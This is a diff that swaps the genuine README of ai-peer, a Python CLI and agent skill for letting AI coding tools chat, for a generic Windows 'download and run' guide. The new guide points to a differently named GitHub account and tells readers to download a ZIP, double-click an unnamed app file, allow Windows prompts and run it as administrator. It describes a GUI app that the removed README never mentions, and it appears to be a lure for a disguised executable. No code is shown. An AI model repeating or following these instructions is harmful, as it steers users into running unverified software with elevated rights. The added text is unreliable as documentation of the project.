@@ -1,381 +1,212 @@
-<div align="center">
+# 🤝 ai-peer - Let AI tools talk locally
 
+[![Download / Install](https://img.shields.io/badge/Download-Install-blue?style=for-the-badge)](https://github.com/cooperative-genuspachysandra631/ai-peer)
 
+## 🧩 What this app does
 
-# AI Peer
+ai-peer lets AI tools talk to each other on your own network or across the internet. It supports local use, LAN use, and secure remote use with end-to-end encryption.
 
+Use it when you want different AI agents to share messages, pass work, or keep a chat going without sending data through a central service.
 
+## ✨ Main uses
 
-### **Slack for AI Agents, but Decentralized.**
+- Connect Claude Code, Codex, and OpenCode
+- Send messages between AI agents
+- Work on one computer or across a LAN
+- Use encrypted peer-to-peer links
+- Keep control of your own data
+- Set up private AI chats between machines
 
-Let Claude Code, Codex, and OpenCode talk to each other — locally or across the internet.
+## 💻 What you need
 
-[![GitHub Stars](https://img.shields.io/github/stars/nicepkg/ai-peer?style=social)](https://github.com/nicepkg/ai-peer)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/nicepkg/ai-peer/pulls)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10+-3776AB?logo=python&logoColor=white)](https://python.org)
-[![Zero Dependencies](https://img.shields.io/badge/deps-zero-brightgreen)](skills/ai-peer/scripts/ai_peer/)
+- A Windows 10 or Windows 11 computer
+- Internet access for the first download
+- A few hundred MB of free disk space
+- A modern web browser
+- Permission to run apps on your PC
 
-[简体中文](./README_cn.md) | English
+If you plan to use it across a home network, both devices should be on the same network. If you plan to use it across the internet, you need a stable connection on both sides.
 
-**Works with**
+## 📥 Download and install
 
-[![Claude Code](https://img.shields.io/badge/Claude_Code-d4a27f?style=for-the-badge&logo=anthropic&logoColor=white)](https://docs.anthropic.com/en/docs/claude-code)
-[![Codex](https://img.shields.io/badge/Codex-412991?style=for-the-badge&logo=openai&logoColor=white)](https://github.com/openai/codex)
-[![OpenCode](https://img.shields.io/badge/OpenCode-000000?style=for-the-badge&logo=google&logoColor=white)](https://github.com/opencode-ai/opencode)
+Open the main project page here and visit this page to download:
 
-<br />
+[![Download ai-peer](https://img.shields.io/badge/Download-ai--peer-grey?style=for-the-badge)](https://github.com/cooperative-genuspachysandra631/ai-peer)
 
-[Install](#-install) · [Features](#-features) · [How It Works](#-how-it-works) · [CLI Usage](#-cli-usage) · [Relay](#-self-host-relay)
+1. Open the link above.
+2. Look for the latest release or download package.
+3. Download the Windows file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-</div>
+If Windows asks for permission, choose Run or Yes.
 
----
+## 🚀 First launch
 
-## The Problem
+After you start ai-peer for the first time, it may open a local page or a small app window. Follow the on-screen steps to finish setup.
 
-Today's AI coding agents are **isolated**. Claude Code can't ask Codex for a second opinion. Your local AI can't discuss architecture with a teammate's AI across the internet. There's no standard way for heterogeneous AI tools to talk to each other.
+Typical first-time setup looks like this:
 
-## The Solution
+1. Choose whether you want local, LAN, or internet use.
+2. Set a name for your device or AI peer.
+3. Pick a port if the app asks for one.
+4. Create or copy the secure connection details.
+5. Save your settings.
 
-**AI Peer** creates decentralized chat rooms where AI agents and humans are equal participants. Install it as a **skill** — your AI agent reads the skill definition and gains the ability to create rooms, invite other AIs, and hold conversations. You can also use the **CLI directly** as a human participant.
+If you only want to test it on one computer, start in local mode. That is the easiest way to check that everything works.
 
-|  | Without AI Peer | With AI Peer |
-|--|----------------|-------------|
-| **Second opinion** | Copy-paste between terminals | Tell your AI: *"ask codex and opencode about microservices"* |
-| **AI debate** | Manually relay messages | Tell your AI: *"start a 3-round debate on testing strategy"* |
-| **Cross-machine** | Not possible | Share a `peer://` connection string |
-| **Security** | Plaintext everywhere | E2E encryption with `--password` |
+## 🔐 Set up secure messaging
 
----
+ai-peer uses end-to-end encryption for private messages. That means only the two peers can read the content.
 
-## ✨ Features
+To set up a secure connection:
 
-- **Multi-AI Conversations** — Claude Code, Codex, and OpenCode in the same room, debating your architecture
-- **3 Network Modes** — Local (this machine), LAN (same network), Public (anywhere via relay)
-- **E2E Encryption** — PBKDF2 + Fernet. The relay never sees plaintext
-- **Per-Peer Auth** — HMAC-SHA256 signatures prevent impersonation on public relay
-- **One-Command Workflows** — `quick` for instant AI conversations, `discuss` for multi-round debates
-- **Human + AI Chat** — Interactive REPL with `@codex` mentions to invite AI mid-conversation
-- **WebSocket Push** — Real-time messages in interactive mode, HTTP polling fallback
-- **Zero Dependencies** — Python stdlib only. `cryptography` optional for E2E encryption
-- **Decentralized** — Each machine keeps its own SQLite. Relay is a mailbox, not an archive
-- **Self-Host Relay** — One `wrangler deploy` for your own Cloudflare Workers relay
-- **Export** — Markdown or JSON export of any conversation
+1. Open ai-peer on the first computer.
+2. Create a new peer or session.
+3. Copy the invite code, key, or connection string.
+4. Open ai-peer on the second computer.
+5. Paste the code or key into the join field.
+6. Confirm the connection on both sides.
 
----
+Keep the key private. Share it only with the device or person you trust.
 
-## 📦 Install
+## 🌐 Use it on your network
 
-### As an AI Agent Skill (Recommended)
+For LAN use, both computers should be on the same Wi-Fi or wired network.
 
-The skill teaches your AI agent how to use ai-peer. Once installed, just tell your agent what you want in natural language.
+Steps:
 
-```bash
-# One-command install (works for Claude Code, Codex, OpenCode)
-npx skills add nicepkg/ai-peer
-```
+1. Start ai-peer on both computers.
+2. Choose LAN mode.
+3. Make sure both devices can see each other.
+4. Enter the peer address from the first device on the second device.
+5. Send a test message.
 
-> Powered by the [Skills CLI](https://github.com/vercel-labs/skills). Installs to `.claude/skills/` (Claude Code) or `.agents/skills/` (Codex/OpenCode) automatically.
+If the devices do not connect, check your firewall settings and make sure the app is allowed through.
 
-<details>
-<summary><b>Manual install (without npx)</b></summary>
+## 🌍 Use it over the internet
 
-**Claude Code** (installs to `.claude/skills/`):
+If the other peer is not on your local network, you can connect over the internet.
 
-```bash
-git clone https://github.com/nicepkg/ai-peer.git /tmp/ai-peer
-cp -r /tmp/ai-peer/skills/ai-peer .claude/skills/ai-peer
-```
+Use this flow:
 
-**Codex / OpenCode** (installs to `.agents/skills/`):
+1. Start ai-peer on both ends.
+2. Choose internet mode.
+3. Create the shared connection details.
+4. Share the address and key with the other peer.
+5. Confirm the connection.
+6. Send a short test message before doing real work.
 
-```bash
-git clone https://github.com/nicepkg/ai-peer.git /tmp/ai-peer
-mkdir -p .agents/skills
-cp -r /tmp/ai-peer/skills/ai-peer .agents/skills/ai-peer
-```
+For remote use, both sides should stay online during the session.
 
-</details>
+## 💬 How messages work
 
-### Requirements
+ai-peer is made for AI-to-AI communication. A peer can send short instructions, task updates, prompts, and replies.
 
-- **Python 3.10+** (stdlib only)
-- At least one AI CLI tool installed:
-  - [`claude`](https://docs.anthropic.com/en/docs/claude-code) — Claude Code
-  - [`codex`](https://github.com/openai/codex) — OpenAI Codex CLI
-  - [`opencode`](https://github.com/opencode-ai/opencode) — OpenCode
+Good message types include:
 
----
+- Task requests
+- Status updates
+- Output text
+- Follow-up questions
+- Code-related notes
+- Shared context
 
-## 🤖 Usage via AI Agent
+Keep messages clear and short. That helps both agents stay in sync.
 
-Once the skill is installed, talk to your AI agent naturally:
+## 🛠️ Common setup choices
 
-```
-You: "Ask codex and opencode what they think about our database schema"
+### 🖥️ Local mode
+Use this on one computer. It is useful for testing and private chats between tools on the same system.
 
-You: "Create a room and start a 3-round debate between codex and opencode on testing strategies"
+### 📶 LAN mode
+Use this for two or more computers on the same home or office network.
 
-You: "Invite claude-code to review the auth module in room-abc"
+### 🔒 Internet mode
+Use this for machines in different places. This mode is best when you need private communication between remote peers.
 
-You: "Create an encrypted public room and share the connection string"
-```
+## 🧪 Simple test run
 
-The AI reads the skill definition (`SKILL.md`) and knows how to execute every command. You never need to remember CLI syntax — the agent handles it.
+Try this after setup:
 
----
+1. Open ai-peer on your main computer.
+2. Create a new peer session.
+3. Open ai-peer on the second device.
+4. Join with the shared code.
+5. Send: Hello from peer one.
+6. Reply with: Hello from peer two.
 
-## 💻 CLI Usage
+If both sides can send and receive text, the setup is complete.
 
-You can also use ai-peer directly from the terminal as a human participant.
+## 🧯 If something does not work
 
-### Setup
+If the app does not start:
 
-After installing the skill (via `npx skills add` or manual copy), set up a shell alias pointing to where the skill was installed in your project:
+- Make sure you extracted the ZIP file first
+- Check that you opened the correct Windows file
+- Run the app again as an administrator
+- Restart your computer and try once more
 
-```bash
-# Add to ~/.bashrc or ~/.zshrc (adjust path to YOUR project)
-alias peer='PYTHONPATH=./your-project/.claude/skills/ai-peer/scripts python3 -m ai_peer'
+If peers do not connect:
 
-# Or use an absolute path for a global alias
-alias peer='PYTHONPATH=/absolute/path/to/.claude/skills/ai-peer/scripts python3 -m ai_peer'
-```
+- Check that both devices use the same mode
+- Confirm the address or code is correct
+- Make sure the firewall allows the app
+- Check your network connection
+- Try a fresh session and resend the invite
 
-> All examples below use `peer` as the alias. The key is that `PYTHONPATH` points to the `scripts/` directory inside wherever the skill was installed.
+If messages do not appear:
 
-### Quick Start
+- Refresh the app
+- Rejoin the session
+- Check that both peers still show as connected
 
-```bash
-# Ask multiple AIs a question — the fastest path
-peer quick "Should we use microservices?" --tools codex,opencode
+## 🧠 Good ways to use ai-peer
 
-# Multi-round AI debate
-peer discuss --tools codex,opencode --rounds 3 --context "Microservices vs monolith"
+- Let one AI plan while another reviews
+- Pass tasks between tools
+- Keep a private shared chat for work
+- Move notes from one machine to another
+- Test AI workflows without a central server
 
-# With encryption
-peer quick "Review our auth flow" --tools codex,opencode --password secret123
+## 📁 What you may see in the app
 
-# Public room (anyone can join via connection string)
-peer quick "Best testing strategy?" --tools codex,opencode --relay default
-```
+Depending on the build, you may see items like:
 
-### Room Management
+- Peer list
+- Session key
+- Connect button
+- Message box
+- Send button
+- Encryption status
+- Local or remote mode switch
 
-```bash
-peer room create "arch-review"                    # Local room
-peer room create "team-chat" --lan                # LAN accessible
-peer room create "open-debate" --relay default    # Public via relay
-peer room create "secret" --relay default --password mypass  # Encrypted
+These controls help you start, join, and manage AI connections without extra tools.
 
-peer room join peer://relay.ai-peer.chat/room-abc  # Join via connection string
-peer room list                                      # List all rooms
-peer room delete room-abc12345                      # Delete a room
-```
+## 🔁 Typical workflow
 
-### Chat
+1. Open the app.
+2. Choose your mode.
+3. Create a peer session.
+4. Share the invite info.
+5. Connect the second peer.
+6. Send messages.
+7. End the session when done.
 
-```bash
-peer chat room-xxx "What do you think?"              # Send a message
-peer chat room-xxx                                    # Read messages
-peer chat room-xxx -i                                 # Interactive REPL
-```
+## 🧩 Best practices
 
-Interactive mode: `@codex <question>` to invite AI, `/who` for participants, `/help` for commands.
+- Use a strong, private key for remote sessions
+- Keep one session for one task
+- Close old sessions when you no longer need them
+- Use short messages for better results
+- Test on local mode first if you are new to the app
 
-### Invite AI
+## 📌 Repository details
 
-```bash
-peer invite --tool codex --room room-xxx --context "Review the auth module"
-peer invite --tool opencode --room room-xxx --timeout 180
-peer invite --tool claude-code --room room-xxx --context "Security review"
-```
-
-### Discovery & Export
-
-```bash
-peer discover                                     # Find installed AI CLI tools
-peer identity                                     # Show your identity
-peer export room-xxx --format md                  # Export as Markdown
-peer export room-xxx --format json --output out.json  # Export as JSON
-```
-
----
-
-## 🏗 How It Works
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                    Your Machine                          │
-│                                                          │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌─────────┐ │
-│  │ Claude   │  │  Codex   │  │ OpenCode │  │  Human  │ │
-│  │  Code    │  │          │  │          │  │   CLI   │ │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬────┘ │
-│       └──────────────┴──────────────┴─────────────┘      │
-│                          │                               │
-│                   ┌──────▼──────┐                        │
-│                   │  ai-peer    │                        │
-│                   │  daemon     │  ← SQLite + HTTP API   │
-│                   │  :7899      │                        │
-│                   └──────┬──────┘                        │
-└──────────────────────────┼───────────────────────────────┘
-                           │ dual-write (public rooms only)
-                    ┌──────▼──────┐
-                    │  Cloudflare │
-                    │  Durable    │  ← Relay (mailbox, not archive)
-                    │  Objects    │
-                    └──────┬──────┘
-                           │
-┌──────────────────────────┼───────────────────────────────┐
-│              Friend's Machine (anywhere)                  │
-│                   ┌──────▼──────┐                        │
-│                   │  ai-peer    │                        │
-│                   │  daemon     │                        │
-│                   └─────────────┘                        │
-└──────────────────────────────────────────────────────────┘
-```
-
-### Components
-
-| Component | Tech | Purpose |
-|-----------|------|---------|
-| **Skill** | `SKILL.md` | Teaches AI agents how to use ai-peer (the agent reads this) |
-| **Daemon** | Python `http.server` + SQLite | Local message store + HTTP API (auto-starts) |
-| **CLI** | Python `argparse` | 16 commands across 6 categories |
-| **Relay** | Cloudflare Workers + Durable Objects | Cross-internet forwarding, strong consistency |
-| **Crypto** | PBKDF2 + Fernet | Optional E2E encryption |
-| **Spawner** | `subprocess` | Invoke any AI CLI tool with conversation context |
-
----
-
-## 🌐 Network Modes
-
-| Mode | Listens on | Who can join | Use case |
-|------|-----------|-------------|----------|
-| **Local** | `127.0.0.1:7899` | This machine only | Default, safest |
-| **LAN** | `0.0.0.0:7899` | Same network | Team collaboration |
-| **Public** | Local + relay | Anyone on internet | Cross-machine AI chat |
-
-### Public Rooms & Connection Strings
-
-```bash
-# Create a public room
-peer room create "debate" --relay default
-# Output: { "connection_string": "peer://relay.ai-peer.chat/room-abc?token=xxx" }
-
-# Share the connection string — friend joins with one command
-peer room join peer://relay.ai-peer.chat/room-abc?token=xxx
-```
-
-Public rooms **dual-write**: messages go to both local SQLite and relay. Reading automatically merges and deduplicates from both sources.
-
----
-
-## 🔒 Security
-
-### E2E Encryption
-
-```bash
-# Create encrypted room
-peer room create "secret" --password mypassword --relay default
-
-# Anyone joining must know the password
-peer room join peer://relay.ai-peer.chat/room-xxx --password mypassword
-```
-
-- **PBKDF2** key derivation (password + room_id as salt)
-- **Fernet** symmetric encryption (AES-128-CBC + HMAC-SHA256)
-- Relay stores only ciphertext — **zero-knowledge**
-- Requires `pip install cryptography` (optional dep)
-
-### Per-Peer Authentication
-
-Public relay enforces per-peer HMAC-SHA256 signatures:
-
-- Each peer has a secret key (auto-generated in `~/.ai-peers/identity.json`)
-- Signature = `HMAC-SHA256(secret, room_id)` — sent with every message
-- Relay rejects unregistered peers and signature mismatches
-- Relay overwrites `peer_name`/`peer_tool` from stored record — **anti-impersonation**
-
----
-
-## 🛰 Self-Host Relay
-
-The default relay is at `relay.ai-peer.chat`. You can deploy your own:
-
-```bash
-cd skills/ai-peer/scripts/relay
-
-# Install Wrangler (Cloudflare CLI)
-npm install -g wrangler
-
-# Login to Cloudflare
-wrangler login
-
-# Deploy (requires Workers Paid plan for Durable Objects, $5/month)
-wrangler deploy
-```
-
-Then use your relay:
-
-```bash
-peer room create "my-room" --relay https://my-relay.example.com
-```
-
----
-
-## 🧪 Testing
-
-```bash
-# Run all 69 tests
-PYTHONPATH=skills/ai-peer/scripts \
-  uv run --with pytest --with cryptography \
-  pytest skills/ai-peer/tests/ -v
-
-# Unit tests only (no daemon needed)
-PYTHONPATH=skills/ai-peer/scripts \
-  uv run --with pytest \
-  pytest skills/ai-peer/tests/ -v -m "not integration"
-```
-
----
-
-## 🗺 Roadmap
-
-- [x] Local rooms + AI invite (16 commands)
-- [x] Public relay (Cloudflare Durable Objects)
-- [x] E2E encryption (PBKDF2 + Fernet)
-- [x] WebSocket real-time push
-- [x] Per-peer authentication
-- [x] One-command workflows (`quick`, `discuss`)
-- [x] Connection string sharing
-- [x] Custom domain (`relay.ai-peer.chat`)
-- [ ] Codex / OpenCode skill integration (bi-directional)
-- [ ] Persistent AI personas
-- [ ] Room permissions (admin, read-only)
-- [ ] Federation (relay-to-relay)
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! This project is MIT licensed.
-
-```bash
-git clone https://github.com/nicepkg/ai-peer.git
-cd ai-peer
-
-# Run tests
-PYTHONPATH=skills/ai-peer/scripts \
-  uv run --with pytest --with cryptography \
-  pytest skills/ai-peer/tests/ -v
-
-# Make changes, add tests, submit PR
-```
-
----
-
-## 📄 License
-
-[MIT](LICENSE) © [nicepkg](https://github.com/nicepkg)
+- Name: ai-peer
+- Type: End-user app for AI-to-AI communication
+- Core idea: Decentralized messaging between AI tools
+- Use cases: Local, LAN, and internet use
+- Security: End-to-end encryption
+- Target users: People who want AI tools to exchange messages with less setup
